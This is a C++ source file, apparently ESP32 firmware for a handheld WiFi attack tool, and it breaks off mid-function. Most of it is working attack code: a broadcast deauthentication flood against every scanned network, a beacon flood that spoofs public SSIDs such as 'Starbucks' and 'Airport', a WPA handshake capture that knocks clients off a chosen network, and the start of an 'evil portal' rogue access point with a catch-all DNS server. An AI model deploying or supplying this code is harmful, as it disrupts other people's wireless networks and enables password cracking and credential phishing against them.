void scanWiFi() {
    showMessage("Scanning WiFi...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    wifiCount = WiFi.scanNetworks();
    if (wifiCount > 50) wifiCount = 50;
    for (int i = 0; i < wifiCount; i++) {
        wifiNames[i] = WiFi.SSID(i);
        if (wifiNames[i].length() == 0) wifiNames[i] = "<Hidden>";
        wifiChannel[i] = WiFi.channel(i);
        wifiRSSI[i] = WiFi.RSSI(i);
        memcpy(wifiBSSID[i], WiFi.BSSID(i), 6);
    }
    char buf[32]; sprintf(buf, "Found: %d", wifiCount);
    showMessage(buf, 1500);
    WiFi.mode(WIFI_AP_STA);
}

void sendDeauth(uint8_t* bssid, uint8_t* client, int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    uint8_t p[26] = {
        0xC0,0x00,0x00,0x00,
        client[0],client[1],client[2],client[3],client[4],client[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        0x00,0x00,0x07,0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA, p, 26, false);
    deauthPackets++;
}

void startDeauth() {
    if (wifiCount == 0) { showMessage("SCAN first!", 1000); return; }
    deauthActive = true;
    deauthPackets = 0;
    showMessage("DEAUTH started", 1000);
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (deauthActive) {
        for (int i = 0; i < wifiCount && deauthActive; i++) {
            sendDeauth(wifiBSSID[i], broadcast, wifiChannel[i]);
        }
        if (deauthPackets % 100 == 0) {
            char buf[32]; sprintf(buf, "Pkts: %lu", deauthPackets);
            showMessage(buf, 100);
        }
        if (checkButton(PIN_BTN_BACK)) deauthActive = false;
        delay(50);
    }
    showMessage("DEAUTH stopped", 1000);
}

void stopDeauth() { deauthActive = false; }

void startBeacon() {
    beaconActive = true;
    beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","PublicWiFi"};
    showMessage("BEACON started", 1000);
    while (beaconActive) {
        for (int s = 0; s < 5 && beaconActive; s++) {
            uint8_t bssid[6];
            for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            uint8_t packet[200]; int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00;
            packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            beaconPackets++;
        }
        if (beaconPackets % 50 == 0) {
            char buf[32]; sprintf(buf, "Sent: %lu", beaconPackets);
            showMessage(buf, 100);
        }
        if (checkButton(PIN_BTN_BACK)) beaconActive = false;
        delay(30);
    }
    showMessage("BEACON stopped", 1000);
}

void stopBeacon() { beaconActive = false; }

void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeActive) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapolCount++;
            addHandshake(currentTarget + " | EAPOL: " + String(eapolCount));
            showMessage("HANDSHAKE CAPTURED!", 2000);
            handshakeActive = false;
            return;
        }
    }
}

void startHandshake() {
    if (wifiCount == 0) { showMessage("SCAN first!", 1000); return; }
    int target = 0;
    while (true) {
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select network:");
        for (int i = 0; i < min(wifiCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, wifiNames[i].substring(0, 14).c_str());
        }
        u8g2.drawStr(5, 60, "OK - Capture BACK"); u8g2.sendBuffer();
        if (checkButton(PIN_BTN_UP) && target > 0) target--;
        else if (checkButton(PIN_BTN_DOWN) && target < min(wifiCount, 5) - 1) target++;
        else if (checkButton(PIN_BTN_OK)) break;
        else if (checkButton(PIN_BTN_BACK)) return;
        delay(50);
    }
    currentTarget = wifiNames[target];
    memcpy(targetBSSID, wifiBSSID[target], 6);
    esp_wifi_set_channel(wifiChannel[target], WIFI_SECOND_CHAN_NONE);
    eapolCount = 0; handshakeActive = true;
    showMessage("Capturing handshake... 30s", 1500);
    unsigned long start = millis();
    while (handshakeActive && millis() - start < 30000) {
        sendDeauth(targetBSSID, (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, wifiChannel[target]);
        delay(100);
    }
    handshakeActive = false;
    if (eapolCount > 0) showMessage("HANDSHAKE saved!", 1500);
    else showMessage("Failed", 1500);
}

void startEvil() {
    if (evilActive) return;
    WiFi.softAP("FREE_WIFI", NULL);
    dnsServer.start(53, "*", WiFi.softAPIP());
    evilActive = true;
    showMessage("EVIL PORTAL: FREE_WIFI", 1500);
    while (evilActive) {
        dnsServer.processNextRequest();
        server.handleClient();
